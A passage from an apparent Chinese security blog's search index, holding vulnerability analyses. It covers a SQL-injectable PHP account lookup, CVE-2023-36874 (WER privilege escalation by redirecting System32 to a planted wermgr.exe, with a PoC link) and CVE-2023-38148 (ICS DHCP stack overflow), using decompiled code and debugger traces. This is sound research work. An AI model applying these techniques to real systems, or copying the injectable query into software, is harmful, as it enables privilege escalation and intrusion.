\u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;key值为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数加密方法错误\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $requestObj = null; //testLog($paramArr); // command_createuser // 遍历数组，将数组的每一项通过_分割，变成键值对 foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } // 获取command对应的值 $cmd = $requestObj[\u0026#39;command\u0026#39;]; if ($cmd == \u0026#34;createUser\u0026#34;) { // 从请求中获取json数据并decode $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $account = $POST_JSON[\u0026#39;account\u0026#39;]; // 这里要保证请求的json数据里面有account if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户账户不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户账号不可为空\u0026#39;); } $account = utf8ToGbk($account); // 这里要保证请求的json数据里面有userPwd $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户密码不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户密码不可为空\u0026#39;); } //账号是否已存在 触发漏洞 $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); Created at 2023-09-20T10:04:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/","title":"CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。\n影响版本 略\n环境搭建 Windows 10 21H2 6月补丁 技术分析\u0026amp;调试 补丁对比 diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。\n对比发现补丁直接阻断了后续CAutoImpersonate::ImpersonateUserHighestPrivs和CWerComReport::_SubmitReport的调用\n//未修复 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } // 修复代码 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::__private_IsEnabled(\u0026amp;`wil::Feature\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::GetImpl\u0026#39;::`2\u0026#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v11 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v11 \u0026gt;= 0) ) { v11 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v11; } 根据函数名CAutoImpersonate::ImpersonateUserHighestPrivs可知，该函数为模拟用户最高的权限并提交report\n动态调试\n开启Problem Reports Control Panel Support服务，对应路径为C:\\Windows\\System32\\svchost.exe -k netsvcs -p。 使用oleviewdotnet查询Problem Reports Control Panel Support服务对应的ole信息\n对应的COM接口的CLSID为\nCLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2 查看这个COM的接口信息 class __declspec(uuid(\u0026#34;6620c14b-70ae-4d4e-a4f6-91a7dcc582c2\u0026#34;)) IErcLuaSupport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStoreFactory** p0); }; class __declspec(uuid(\u0026#34;4904c154-426f-4c88-8ec2-4543d18670f7\u0026#34;)) IWerStoreFactory : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStore** p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ IWerStore** p0); }; class __declspec(uuid(\u0026#34;1e3a0e4f-1412-444f-8a94-fc6a09cd4195\u0026#34;)) IWerStore : public IUnknown { public: virtual HRESULT __stdcall Proc3(); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ IWerReport** p1); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); }; class __declspec(uuid(\u0026#34;d01b8f28-0bd1-4652-a415-8229f5ee506c\u0026#34;)) IWerReport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc13(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc14(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc15(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc16(/* Stack Offset: 8 */ struct Struct_1* p0); virtual HRESULT __stdcall Proc17(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc18(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc19(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc20(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc21(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc22(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t* p1, /* Stack Offset: 24 */ int64_t* p2, /* Stack Offset: 32 */ BSTR* p3, /* Stack Offset: 40 */ BSTR* p4); virtual HRESULT __stdcall Proc23(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc24(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ IWerReportSubmitCallback* p2, /* Stack Offset: 32 */ /* unique */BSTR* p3, /* Stack Offset: 40 */ /* unique */int64_t* p4); virtual HRESULT __stdcall Proc25(); }; 这里需要知道Windows的[[../../../05 Windows/COM模型/COM模型 OVERVIEW|COM模型)，COM模型定义了二进制标准，以支持组件复用。将操作系统API抽象成了接口，可以通过接口的标识符实例化COM对象并通过COM对象调用服务接口。即\n当使用COM接口调用error reporting 服务并提交错误报告时，error reporting会启动 C:\\Windows\\System32\\wermgr.exe，并且启动时权限为 NT AUTHORITY\\SYSTEM。 追溯调用栈 查看此事件的调用栈，wer!WerpAuxmdMapFile+0x3887d 处调用了CreateProcessW\nwer!WerpAuxmdMapFile+0x3887d位于 UtilLaunchWerManager函数内，代码如下\n__int64 __fastcall UtilLaunchWerManager( const unsigned __int16 **a1, __int64 a2, __int64 a3, void *a4, void **a5, void **a6, unsigned int a7, void **a8) { .... WCHAR Buffer[264]; // [rsp+148h] [rbp+40h] BYREF v43 = -2i64; v39 = a1; v8 = a5; lpValue = a8; memset_0(Buffer, 0, 0x208ui64); lpCommandLine[0] = 0i64; lpCommandLine[1] = 0i64; ..... goto LABEL_67; } v11 = StringCchCatW(Buffer, 0x104ui64, L\u0026#34;\\\\wermgr.exe\u0026#34;); v12 = v11; if ( v11 \u0026gt;= 0 ) { v12 = CString::Sprintf((CString *)lpCommandLine, L\u0026#34;\\\u0026#34;%s\\\u0026#34; \u0026#34;, Buffer); if ( (v12 \u0026amp; 0x80000000) != 0 ) { if ( WPP_GLOBAL_Control != (HKEY)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) != 0 ) { WPP_SF_S(*((_QWORD *)WPP_GLOBAL_Control + 2), 20i64, \u0026amp;WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer); goto LABEL_37; } goto LABEL_38; } v13 = 0; v14 = lpCommandLine[0]; while ( v13 \u0026lt; 0xE ) { ..... v19 = CString::Append((CString *)lpCommandLine, v40[0]); if ( v19 \u0026gt;= 0 || WPP_GLOBAL_Control == (HKEY)\u0026amp;WPP_GLOBAL_Control || ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) == 0 ) { v14 = lpCommandLine[0]; } .... if ( UpdateProcThreadAttribute(v10, 0, 0x20002ui64, lpValue, 8i64 * a7, 0i64, 0i64) ) { StartupInfo.cb = 112; v45 = v10; if ( CreateProcessW(Buffer, v14, 0i64, 0i64, 2, 0x80000u, 0i64, 0i64, \u0026amp;StartupInfo, \u0026amp;hObject) ) { v12 = 0; } ...... } 向上追溯调用栈，UtilLaunchWerManager函数由 CReportManager::ReportProblemOutOfProcess调用， 再上层函数为CReportManager::ReportProblem，CReportManager::ReportProblem由ReportHandleInstance::SubmitReport调用，在上层函数为WerpSubmitReportFromStore。在wecplsupport!DllCanUnloadNew+0x2bf2处调用了wer.dll!WerpSubmitReportFromStore函数。\nwercplsupport!DllCanUnloadNew+0x2bf2实际位于 wercplsupport!CWerComReport::_SubmitReport函数内，代码如下。\n__int64 __fastcall CWerComReport::_SubmitReport( void **this, unsigned __int16 *a2, unsigned int a3, struct IUnknown *a4, unsigned __int16 **a5, unsigned int *a6) { ...... v24 = \u0026amp;CStubUI::`vftable\u0026#39;; if ( a4 ) ((void (__fastcall *)(struct IUnknown *))a4-\u0026gt;lpVtbl-\u0026gt;AddRef)(a4); v25 = a4; v23[0] = 0i64; TokenHandle = 0i64; v26 = 0; v10 = a5; if ( a5 ) { SysFreeString(*a5); *v10 = 0i64; } WerApiLock = CWerApiAutoLock::TryGetWerApiLock((CWerApiAutoLock *)v23, (struct CWerComReport *)this); if ( WerApiLock \u0026gt;= 0 ) { ..... } else { CurrentThread = GetCurrentThread(); if ( OpenThreadToken(CurrentThread, 0xF01FFu, 1, \u0026amp;TokenHandle) || GetLastError() == 1008 ) { ..... } else { WerApiLock = WerpSubmitReportFromStore( *((void **)this[5] + 4), a2, this[4], (struct IReportUI *)((unsigned __int64)\u0026amp;v24 \u0026amp; -(__int64)(a4 != 0i64)), \u0026amp;v21, a3, (enum _WER_SUBMIT_RESULT *)\u0026amp;v20); ..... } _SubmitReport由 CWerComReport::SubmitReport调用，而 CWerComReport::SubmitReport为IWerReport接口公开的函数。\n__int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } 所以可以总结出调用链：wecplsupport!CWerComReport::SubmitReport-\u0026gt;wecplsupport!CWerComReport::_SubmitReport-\u0026gt;wer.dll!WerpSubmitReportFromStore...-\u0026gt;CreateProcessW\n问题在于在调用CreateProcessW时，CreateProcessW会使用攻击者设置的文件重定向，但将使用调用CreateProcessW的进程的security token设置进程的context，而不是模拟token来设置进程的security context。\n也就是攻击者可以通过文件重定向将 C:\\Windows\\System32重定向到攻击者可控目录，并且在可控目录写入恶意 wermgr.exe，当触发CreateProcessW时，CreateProcessW将使用攻击者控制的目录的wermgr.exe文件而不是系统在C:\\Windows\\System32目录下的wermgr.exe文件。并且该进程上下文继承了调用进程的上下文，即继承了wer服务的权限。\n动态调试 在 UtilLaunchWerManager断点\nbp wer!UtilLaunchWerManager 调试器断下\n0:006\u0026gt; g Breakpoint 2 hit wer!UtilLaunchWerManager+0xf3: 00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0) 0:006\u0026gt; rrcx rcx=00000041e2efbce0 补丁分析 前面知道补丁直接阻断了后续调用_submit，也就没办法再调用CreateProcess，从而阻断了调用链。\nPoC\nhttps://github.com/Wh04m1001/CVE-2023-36874 需要注意的是运行poc需要使用不在admin组的用户，新增用户运行\nnet user test 123456 /add 参考链接\nhttps://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/\nCreated at 2023-09-19T10:26:14+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/","title":"CVE-2023-38148 Windows Ics Rce分析","tags":["漏洞分析"],"description":"","content":"基本信息 依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖ipnathlp.dll\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess 漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。 服务调试参考第二个参考链接。\n影响版本 略\n环境搭建 参考 https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。\n技术分析\u0026amp;调试 静态分析 对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。\n在修复版本中在进行 if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u )判断之前先调用了 DumpDhcpHeaderInfo，在漏洞代码中先进行判断在调用DumpDhcpHeaderInfo 在修复版本中如果满足 if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) 则进入if内，在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。 可以看出 a2 + 230为_NH_BUFFER 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。\n所以漏洞应该是第二点所说的，产生在略过的逻辑中。\n// 未修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( v4 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v4 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v4 + 25) \u0026gt;= 4u ) WPP_SF_dD( *((_QWORD *)v4 + 2), 97i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids, *((unsigned __int8 *)a2 + 230), 32); _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics); } DumpDhcpHeaderInfo(a2); // 修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v11, 0, 0x40ui64); DumpDhcpHeaderInfo(a2); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_dd( *((_QWORD *)WPP_GLOBAL_Control + 2), 97i64, \u0026amp;WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids, *((unsigned __int8 *)a2 + 230), 32); } goto LABEL_10; } LABEL_10: _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics);// 这里多了调用 goto LABEL_11; ...... LABEL_11: EnterCriticalSection(\u0026amp;DhcpInterfaceLock); if ( *((int *)a1 + 19) \u0026lt; 0 ) { LeaveCriticalSection(\u0026amp;DhcpInterfaceLock); 略过的代码中，读取了a2参数的代码如下：\nif ( DhcpExtractOptionsFromMessage((struct _NH_BUFFER *)((char *)a2 + 228), *((_DWORD *)a2 + 55), \u0026amp;v11) ) ..... if ( !v12 ) { ..... DhcpProcessBootpMessage(a1, a2, \u0026amp;v11); goto LABEL_11; } ..... if ( DhcpIsLocalHardwareAddress((unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)) ) { .... } v7 = *(unsigned __int8 *)(v12 + 2); if ( v7 == 1 ) { ..... DhcpProcessDiscoverMessage(a1, a2, \u0026amp;v11); } else if ( *(_BYTE *)(v12 + 2) == 3 ) { ...... DhcpProcessRequestMessage(a1, a2, \u0026amp;v11); } ...... } if ( !DhcpArpForDad ) { v10 = *(_DWORD *)(v13 + 2); DhcpRemoveArpEntry(v10); DhcpCancelLease(v10, (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); ..... } else { if ( *(_BYTE *)(v12 + 2) != 7 ) { if ( *(_BYTE *)(v12 + 2) == 8 ) { ...... DhcpProcessInformMessage(a1, a2, \u0026amp;v11); } else { ...... } goto LABEL_11; } if ( !DhcpArpForDad ) { DhcpRemoveArpEntry(*((_DWORD *)a2 + 60)); DhcpCancelLease(*((_DWORD *)a2 + 60), (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); } ...... } 查看这些函数代码，在 DhcpProcessBootpMessage函数中有如下逻辑\nvoid __fastcall DhcpProcessBootpMessage( v3 = a2; v5 = (char *)v3 + 228; ...... else { if ( !DhcpSendUnicastMessagesEnabled || v5[10] \u0026lt; 0 || DhcpAddArpEntry(v6, (unsigned __int8 *)v5 + 28, (unsigned __int8)v5[2], v23) )// 这个函数触发了漏洞 { // movzx r8d, byte ptr [r15+2] ; Size ... 前面知道 a2 + 230是长度字段，v5=v2+228，传入 DhcpAddArpEntry的size参数为v5+2，也就是a2 + 230 在 DhcpAddArpEntry函数中，Row为栈内结构体，memcpy传入的长度参数为a2 + 230，也就是补丁中判断的长度参数。 MIB_IPNET_ROW2结构体定义可以在\r这找到，其大小为0x58\n__int64 __fastcall DhcpAddArpEntry(DWORD a1, unsigned __int8 *Src, size_t Size, struct _DHCP_INTERFACE *a4) { MIB_IPNET_ROW2 Row; ...... v4 = (unsigned int)Size; ..... memset_0(\u0026amp;Row, 0, sizeof(Row)); Row.InterfaceIndex = DhcpAdapterIndex; Row.Address.Ipv4.sin_family = 2; Row.Address.Ipv4.sin_addr.S_un.S_addr = a1; Row.PhysicalAddressLength = v4; memcpy_0(Row.PhysicalAddress, Src, v4); ...... return v11; } } 所以漏洞触发路径为 DhcpProcessMessage-\u0026gt;DhcpProcessBootpMessage-\u0026gt;DhcpAddArpEntry-\u0026gt;memcpy_0，当长度参数过长时可以利用memcpy触发栈溢出。\n动态调试 使用windbg附加到svchost进程，在 ipnathlp!DhcpProcessMessage断点，而后触发DHCP请求，windbg在 ipnathlp!DhcpProcessMessage断下 由于不知道 DhcpProcessMessage的a2结构体定义，此处构造正常的DHCP请求，并在调试器中查看这个结构体成员信息。 单步运行到判断长度的地方，此时rsi指向传入的 _NH_BUFFER结构体，\n0:004\u0026gt; u ipnathlp!DhcpProcessMessage+0x7f: 00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h] 00007ff9`c00176fa 41b604 mov r14b,4 00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h 00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739) 00007ff9`c0017703 493bdc cmp rbx,r12 00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b 00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 可以在调试器内看到 (_BYTE *)a2 + 230)值为6\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 而该处数据来源于DHCP客户端发送的DHCP请求，在wireshark中可以看到数据包中刚好有长度字段值为6，说明(_BYTE *)a2 + 230)处有可能是数据包内的Hardware address length。\n此时调用栈：\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 此时尝试手动将(_BYTE *)a2 + 230)修改为0xfe，继续运行，但没有触发异常。\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:004\u0026gt; eb rdi+2 fe 0:004\u0026gt; db rdi+2 00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:002\u0026gt; g Breakpoint 0 hit ipnathlp!DhcpProcessMessage: 00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350 改为单步调试，再次发起DHCP请求，发现没有进入到漏洞函数 DhcpProcessBootpMessage中，原因是v13不为0，条件不成立，不会调用 DhcpProcessBootpMessage\nif ( !v13 ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 98i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); } DhcpProcessBootpMessage(a1, a2, \u0026amp;v12); // 这里触发漏洞 goto LABEL_25; } 对v13下写断点\n0:004\u0026gt; ba w1 rsp+0x38 0:004\u0026gt; g Breakpoint 6 hit msvcrt!memset+0x35: 00007ff9`ed1046b5 4983e908 sub r9,8 触发断点，此时调用栈如下，对应代码为 memset_0(a3, 0, 0x40ui64);\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 此处将目标内存清零，不符合前面说的条件，继续运行，再次触发写断，调用栈为\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 对应在DhcpExtractOptionsFromMessage的代码如下，当OptionID为0x35时进入case语句内\nv9 = (struct _DHCP_OPTION *)((char *)a1 + 240); OptionID = v9-\u0026gt;OptionID; if ( OptionID ) { switch ( OptionID ) case 0x35u: if ( v6 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v6 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v6 + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)v6 + 2), 44i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); v6 = WPP_GLOBAL_Control; } if ( BYTE1(v9-\u0026gt;OptionID) ) { a3[1] = v9; } _DHCP_OPTION结构体定义如下，对应于DHCP请求内的option\ntypedef DWORD DHCP_OPTION_ID; struct _DHCP_OPTION { DHCP_OPTION_ID OptionID; LPWSTR OptionName; LPWSTR OptionComment; DHCP_OPTION_DATA DefaultValue; DHCP_OPTION_TYPE OptionType; }; 0:002\u0026gt; db rdi 00000203`faa1fea4 35 01 03 3d 07 01 00 0c-29 c2 3a 42 32 04 c0 a8 5..=....).:B2... 00000203`faa1feb4 89 cd 0c 0f 44 45 53 4b-54 4f 50 2d 54 35 50 